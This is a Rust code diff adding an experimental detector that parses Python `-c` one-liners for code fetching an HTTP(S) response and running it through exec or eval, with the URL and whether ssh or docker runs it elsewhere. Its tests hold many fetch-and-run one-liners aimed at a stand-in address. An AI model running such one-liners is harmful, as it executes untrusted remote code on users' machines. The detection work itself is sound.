@@ -1,7 +1,8 @@
 //! Reads the transfer a tokenized command segment requests: an object-storage
 //! copy, move or sync with the AWS CLI (`aws s3`), `gsutil` or `rclone`, or a
 //! GitHub CLI publication of a file (an issue or pull request body file, or a
-//! gist file).
+//! gist file). It also reads, experimentally, a Python one-liner that fetches
+//! an HTTP(S) response and runs it as code ([`fetched_code`]).
 //!
 //! A [`Transfer`] is what the command text asks for, never what ran: this
 //! does not know whether the command executed, succeeded or moved any bytes.
@@ -656,6 +657,342 @@ fn walk(
     None
 }
 
+/// A Python one-liner that fetches a response and runs it as code.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct FetchedCode<'a> {
+    /// The HTTP(S) URL the code fetches.
+    pub url: &'a str,
+    /// Whether a wrapper runs the one-liner on another host or in a container.
+    pub elsewhere: bool,
+}
+
+/// The fetch a Python one-liner's `-c` code runs as code (experimental): a
+/// `python`, `python3`, `python3.x` or `py` invocation, read through wrappers
+/// as other clients are, whose code passes a fetched response to `exec` or
+/// `eval`, as [`fetch_then_exec`] reads it from the code's names, calls and
+/// string literals.
+pub fn fetched_code(tokens: &[String]) -> Option<FetchedCode<'_>> {
+    tokens
+        .iter()
+        .map(|token| client_name(token))
+        .filter(|name| python(name))
+        .find_map(|name| {
+            let (at, _, elsewhere) = walk(tokens, &[name.as_str()], false)?;
+            let url = fetch_then_exec(python_code(&tokens[at + 1..])?)?;
+            Some(FetchedCode { url, elsewhere })
+        })
+}
+
+/// A Python launcher's command word.
+fn python(name: &str) -> bool {
+    name == "py"
+        || name
+            .strip_prefix("python")
+            .is_some_and(|version| version.bytes().all(|b| b.is_ascii_digit() || b == b'.'))
+}
+
+/// The code after a Python launcher's `-c`, behind options that take no value,
+/// `-W`/`-X` and their values, and a `py` version (`-3`, `-3.12`).
+fn python_code(args: &[String]) -> Option<&str> {
+    let mut args = args.iter();
+    while let Some(arg) = args.next() {
+        let flags = arg.strip_prefix('-').filter(|flags| !flags.is_empty())?;
+        for (at, flag) in flags.char_indices() {
+            match flag {
+                'c' => {
+                    let rest = &flags[at + 1..];
+                    return if rest.is_empty() {
+                        args.next().map(String::as_str)
+                    } else {
+                        Some(rest)
+                    };
+                }
+                'W' | 'X' => {
+                    if at + 1 == flags.len() {
+                        args.next();
+                    }
+                    break;
+                }
+                'b'
+                | 'B'
+                | 'd'
+                | 'E'
+                | 'I'
+                | 'O'
+                | 'P'
+                | 'q'
+                | 's'
+                | 'S'
+                | 'u'
+                | 'v'
+                | 'x'
+                | '0'..='9'
+                | '.' => {}
+                _ => return None,
+            }
+        }
+    }
+    None
+}
+
+/// Bounds the work spent reading one `-c` word.
+const MAX_FETCHED_CODE: usize = 4096;
+
+/// The HTTP fetch calls read, by dotted name. A bare `urlopen` counts after
+/// `from urllib.request import urlopen`.
+const FETCHES: [&str; 6] = [
+    "urllib.request.urlopen",
+    "requests.get",
+    "requests.post",
+    "httpx.get",
+    "urllib3.request",
+    "urlopen",
+];
+
+/// What a fetched response may be read through before it runs: methods
+/// called, then attributes.
+const RESPONSE_METHODS: [&str; 2] = ["read", "decode"];
+const RESPONSE_ATTRIBUTES: [&str; 3] = ["text", "content", "data"];
+
+/// One piece of Python code: a dotted name (`a.b`, or `.b` after a call), a
+/// string literal's body, or another character.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum Piece<'a> {
+    Name(&'a str),
+    Text(&'a str),
+    Mark(u8),
+}
+
+/// The pieces of Python code, or `None` for an unterminated string. Comments
+/// are left out; a newline is a mark.
+fn pieces(code: &str) -> Option<Vec<Piece<'_>>> {
+    let bytes = code.as_bytes();
+    let word = |b: u8| b.is_ascii_alphanumeric() || b == b'_' || b == b'.';
+    let mut pieces = Vec::new();
+    let mut at = 0;
+    while let Some(&byte) = bytes.get(at) {
+        if byte == b'#' {
+            at = code[at..].find('\n').map_or(bytes.len(), |end| at + end);
+        } else if byte == b'\'' || byte == b'"' {
+            let quote = if bytes[at..].starts_with(&[byte; 3]) {
+                &bytes[at..at + 3]
+            } else {
+                &bytes[at..=at]
+            };
+            let start = at + quote.len();
+            let mut end = start;
+            loop {
+                match bytes.get(end) {
+                    None => return None,
+                    Some(b'\\') => end += 2,
+                    Some(_) if bytes[end..].starts_with(quote) => break,
+                    Some(_) => end += 1,
+                }
+            }
+            pieces.push(Piece::Text(code.get(start..end)?));
+            at = end + quote.len();
+        } else if word(byte) && !byte.is_ascii_digit() {
+            let start = at;
+            while bytes.get(at).is_some_and(|&b| word(b)) {
+                at += 1;
+            }
+            let name = &code[start..at];
+            // A string prefix (`b'…'`, `rb"…"`) is part of the string.
+            let prefix = name.len() <= 2
+                && name.bytes().all(|b| b"rRbBuUfF".contains(&b))
+                && matches!(bytes.get(at), Some(b'\'' | b'"'));
+            if !prefix {
+                pieces.push(Piece::Name(name));
+            }
+        } else {
+            if !matches!(byte, b' ' | b'\t' | b'\r') {
+                pieces.push(Piece::Mark(byte));
+            }
+            at += 1;
+        }
+    }
+    Some(pieces)
+}
+
+/// The index of the `)` closing the `(` at `open`.
+fn closing(pieces: &[Piece<'_>], open: usize) -> Option<usize> {
+    let mut depth = 0usize;
+    for (at, piece) in pieces.iter().enumerate().skip(open) {
+        match piece {
+            Piece::Mark(b'(') => depth += 1,
+            Piece::Mark(b')') => {
+                depth -= 1;
+                if depth == 0 {
+                    return Some(at);
+                }
+            }
+            _ => {}
+        }
+    }
+    None
+}
+
+/// What one-liner code has bound so far: whether `urlopen` was imported, the
+/// names bound to a URL and the names bound to a fetched response,
+/// each with its URL.
+#[derive(Default)]
+struct Bindings<'a> {
+    urlopen: bool,
+    urls: Vec<(&'a str, &'a str)>,
+    fetched: Vec<(&'a str, &'a str)>,
+}
+
+/// An HTTP(S) URL string.
+fn http_url(text: &str) -> bool {
+    (scheme(text, "http://") && text.len() > 7) || (scheme(text, "https://") && text.len() > 8)
+}
+
+impl<'a> Bindings<'a> {
+    /// The fetched response that starts at `at`, read through response
+    /// methods and attributes or `compile(…)`: where it ends and its URL.
+    fn fetched(&self, pieces: &[Piece<'a>], at: usize) -> Option<(usize, &'a str)> {
+        let Piece::Name(name) = *pieces.get(at)? else {
+            return None;
+        };
+        let call = pieces.get(at + 1) == Some(&Piece::Mark(b'('));
+        if name == "compile" && call {
+            let (end, url) = self.fetched(pieces, at + 2)?;
+            if !matches!(pieces.get(end)?, Piece::Mark(b',' | b')')) {
+                return None;
+            }
+            return Some((closing(pieces, at + 1)? + 1, url));
+        }
+        // The fetch or bound name, then what the name reads of it.
+        let (url, mut rest, mut end) = match FETCHES.iter().find(|fetch| **fetch == name) {
+            Some(&fetch) if call && (fetch != "urlopen" || self.urlopen) => {
+                let close = closing(pieces, at + 1)?;
+                let url = pieces[at + 2..close]
+                    .iter()
+                    .find_map(|piece| match *piece {
+                        Piece::Text(text) if http_url(text) => Some(text),
+                        Piece::Name(name) => self.url(name),
+                        _ => None,
+                    })?;
+                (url, "", close + 1)
+            }
+            _ => {
+                let (base, rest) = name.split_once('.').unwrap_or((name, ""));
+                let url = self.fetched.iter().find(|(bound, _)| *bound == base)?.1;
+                (url, rest, at + 1)
+            }
+        };
+        loop {
+            let members = rest.split('.').filter(|member| !member.is_empty());
+            let count = members.clone().count();
+            for (index, member) in members.enumerate() {
+                // Only the last member of a name is followed by its call.
+                let called = index + 1 == count && pieces.get(end) == Some(&Piece::Mark(b'('));
+                if RESPONSE_METHODS.contains(&member) && called {
+                    end = closing(pieces, end)? + 1;
+                } else if called || !RESPONSE_ATTRIBUTES.contains(&member) {
+                    return None;
+                }
+            }
+            match pieces.get(end) {
+                Some(Piece::Name(next)) if next.starts_with('.') => {
+                    rest = next;
+                    end += 1;
+                }
+                _ => return Some((end, url)),
+            }
+        }
+    }
+
+    /// The URL a name is bound to.
+    fn url(&self, name: &str) -> Option<&'a str> {
+        self.urls
+            .iter()
+            .find(|(bound, _)| *bound == name)
+            .map(|(_, url)| *url)
+    }
+
+    /// Reads one statement: an import of `urlopen`, a name bound to a URL or
+    /// a fetched response, or an `exec`/`eval` of a fetched response, whose
+    /// URL it returns.
+    fn statement(&mut self, statement: &[Piece<'a>]) -> Option<&'a str> {
+        match statement {
+            [
+                Piece::Name("from"),
+                Piece::Name("urllib.request"),
+                Piece::Name("import"),
+                names @ ..,
+            ] => {
+                self.urlopen |= names.iter().enumerate().any(|(at, piece)| {
+                    *piece == Piece::Name("urlopen")
+                        && names.get(at + 1) != Some(&Piece::Name("as"))
+                });
+            }
+            // A name bound again holds only its new value.
+            [Piece::Name(name), Piece::Mark(b'='), value @ ..]
+                if !name.contains('.') && value.first() != Some(&Piece::Mark(b'=')) =>
+            {
+                let url = match value {
+                    [Piece::Text(text)] if http_url(text) => Some((true, *text)),
+                    _ => self
+                        .fetched(value, 0)
+                        .filter(|(end, _)| *end == value.len())
+                        .map(|(_, url)| (false, url)),
+                };
+                self.urls.retain(|(bound, _)| bound != name);
+                self.fetched.retain(|(bound, _)| bound != name);
+                match url {
+                    Some((true, url)) => self.urls.push((name, url)),
+                    Some((false, url)) => self.fetched.push((name, url)),
+                    None => {}
+                }
+            }
+            _ => {}
+        }
+        statement.windows(2).enumerate().find_map(|(at, pair)| {
+            let [Piece::Name("exec" | "eval"), Piece::Mark(b'(')] = pair else {
+                return None;
+            };
+            // An attribute of another object (`obj . exec(…)`) is not the builtin.
+            let attribute = at.checked_sub(1).and_then(|before| statement.get(before));
+            if matches!(attribute, Some(Piece::Mark(b'.')))
+                || matches!(attribute, Some(Piece::Name(name)) if name.ends_with('.'))
+            {
+                return None;
+            }
+            let (end, url) = self.fetched(statement, at + 2)?;
+            matches!(statement.get(end)?, Piece::Mark(b',' | b')')).then_some(url)
+        })
+    }
+}
+
+/// The URL whose response one-liner code runs: code that calls a listed fetch
+/// of an HTTP(S) URL (a string, or a name bound to one) and passes the response
+/// itself, a response method or attribute, or a name bound to one of these to
+/// `exec` or `eval`, directly or through `compile`.
+fn fetch_then_exec(code: &str) -> Option<&str> {
+    if code.len() > MAX_FETCHED_CODE {
+        return None;
+    }
+    let pieces = pieces(code)?;
+    let mut bindings = Bindings::default();
+    let mut depth = 0usize;
+    let mut start = 0;
+    for (at, piece) in pieces.iter().enumerate() {
+        match piece {
+            Piece::Mark(b'(' | b'[' | b'{') => depth += 1,
+            Piece::Mark(b')' | b']' | b'}') => depth = depth.checked_sub(1)?,
+            Piece::Mark(b';' | b'\n') if depth == 0 => {
+                if let Some(url) = bindings.statement(&pieces[start..at]) {
+                    return Some(url);
+                }
+                start = at + 1;
+            }
+            _ => {}
+        }
+    }
+    bindings.statement(&pieces[start..])
+}
+
 /// Whether an option word takes the next token as its value: a `long` option
 /// without an attached `=value` (`--user deploy`), or a short cluster whose
 /// first value-taking letter in `short` ends it (`-u deploy`, `-iu deploy`,
@@ -1036,6 +1373,170 @@ mod tests {
         assert_eq!(
             super::launched_script(&quoted(&["cmd", "/c", "echo", "x & aws s3 cp ./d s3://b/"])),
             None
+        );
+    }
+
+    /// Shell words: the launcher words, then the code as one word.
+    fn one_liner(launcher: &str, code: &str) -> Vec<String> {
+        let mut tokens = words(launcher);
+        tokens.push(code.to_owned());
+        tokens
+    }
+
+    fn fetched(url: &str, elsewhere: bool) -> Option<super::FetchedCode<'_>> {
+        Some(super::FetchedCode { url, elsewhere })
+    }
+
+    #[test]
+    fn a_python_one_liner_that_runs_a_fetched_response_reads_its_url() {
+        let tokens = one_liner(
+            "python3 -c",
+            "import urllib.request;exec(urllib.request.urlopen('https://203.0.113.10/x.py').read())",
+        );
+        assert_eq!(
+            super::fetched_code(&tokens),
+            fetched("https://203.0.113.10/x.py", false)
+        );
+    }
+
+    #[test]
+    fn a_fetched_text_or_a_name_bound_to_it_is_read_as_the_code() {
+        for (launcher, code) in [
+            (
+                "python -c",
+                "import requests; u='https://203.0.113.10/x.py'; exec(requests.get(u).text)",
+            ),
+            (
+                "py -3 -c",
+                "import requests; r = requests.get(\"https://203.0.113.10/x.py\"); exec(r.text)",
+            ),
+            (
+                "python3.12 -I -c",
+                "from urllib.request import urlopen\nc = urlopen('https://203.0.113.10/x.py').read().decode()\nexec(c)",
+            ),
+            (
+                "python3 -c",
+                "import httpx; exec(compile(httpx.get('https://203.0.113.10/x.py').content, 'x', 'exec'))",
+            ),
+            (
+                "python3 -c",
+                "import requests;eval(requests.post('https://203.0.113.10/x.py', data={}).text)",
+            ),
+            (
+                "sudo -u deploy env A=1 python3 -c",
+                "import urllib.request;exec(urllib.request.urlopen('https://203.0.113.10/x.py').read())",
+            ),
+        ] {
+            assert_eq!(
+                super::fetched_code(&one_liner(launcher, code)),
+                fetched("https://203.0.113.10/x.py", false),
+                "{launcher} {code}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_one_liner_another_host_or_a_container_runs_is_elsewhere() {
+        let code = "import urllib.request;exec(urllib.request.urlopen('https://203.0.113.10/x.py').read())";
+        for launcher in ["ssh host python3 -c", "docker exec c python3 -c"] {
+            assert_eq!(
+                super::fetched_code(&one_liner(launcher, code)),
+                fetched("https://203.0.113.10/x.py", true),
+                "{launcher}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_fetch_whose_response_is_not_run_reads_as_none() {
+        for (launcher, code) in [
+            (
+                "python3 -c",
+                "import urllib.request; print(urllib.request.urlopen('https://203.0.113.10/x').status)",
+            ),
+            (
+                "python3 -c",
+                "import urllib.request; print(urllib.request.urlopen('https://203.0.113.10/x').read())",
+            ),
+            (
+                "python3 -c",
+                "import json, requests; d = json.loads(requests.get('https://203.0.113.10/a.json').text); print(d)",
+            ),
+            (
+                "python3 -c",
+                "import requests; open('x.py', 'w').write(requests.get('https://203.0.113.10/x.py').text)",
+            ),
+            (
+                "python3 -c",
+                "import requests; requests.get('https://203.0.113.10/x'); exec('print(1)')",
+            ),
+            (
+                "python3 -c",
+                "exec(urlopen('https://203.0.113.10/x.py').read())",
+            ),
+            ("python3 -c", "exec('print(1)')"),
+            (
+                "python3 -c",
+                "import requests; print(requests.get('https://203.0.113.10/x').text + '\\é')",
+            ),
+            (
+                "echo python3 -c",
+                "exec(urlopen('https://203.0.113.10/x.py').read())",
+            ),
+            ("python3 -m", "http.server"),
+        ] {
+            assert_eq!(
+                super::fetched_code(&one_liner(launcher, code)),
+                None,
+                "{launcher} {code}"
+            );
+        }
+        assert_eq!(
+            super::fetched_code(&words("python3 script.py https://203.0.113.10/x.py")),
+            None
+        );
+        assert_eq!(super::fetched_code(&words("pip install requests")), None);
+    }
+
+    #[test]
+    fn code_that_only_names_a_fetch_and_exec_reads_as_none() {
+        for code in [
+            "import requests; print(\"exec(requests.get('https://203.0.113.10/x').text)\")",
+            "import requests\n# exec(requests.get('https://203.0.113.10/x').text)",
+            "import requests; cursor.execute(requests.get('https://203.0.113.10/x').text)",
+            "import requests; obj.exec(requests.get('https://203.0.113.10/x').text)",
+            "import requests; obj . exec(requests.get('https://203.0.113.10/x').text)",
+            "import requests; r = requests.get('https://203.0.113.10/x'); eval(r.status_code)",
+            "import my_requests; exec(my_requests.get('https://203.0.113.10/x').text)",
+            "import requests; compile(requests.get('https://203.0.113.10/x').text, 'x', 'exec')",
+            "import requests; r = requests.get('https://203.0.113.10/x'); s = 'print(1)'; exec(s)",
+        ] {
+            assert_eq!(
+                super::fetched_code(&one_liner("python3 -c", code)),
+                None,
+                "{code}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_name_bound_again_reads_its_last_value() {
+        for code in [
+            "import requests; r = requests.get('https://203.0.113.10/x'); r = 'print(1)'; exec(r)",
+            "import requests; u = 'https://203.0.113.10/x'; u = 'local.txt'; exec(requests.get(u).text)",
+        ] {
+            assert_eq!(
+                super::fetched_code(&one_liner("python3 -c", code)),
+                None,
+                "{code}"
+            );
+        }
+        assert_eq!(
+            super::fetched_code(&one_liner(
+                "python3 -c",
+                "import requests; r = 'print(1)'; r = requests.get('https://203.0.113.10/x.py'); exec(r.text)",
+            )),
+            fetched("https://203.0.113.10/x.py", false)
         );
     }
 
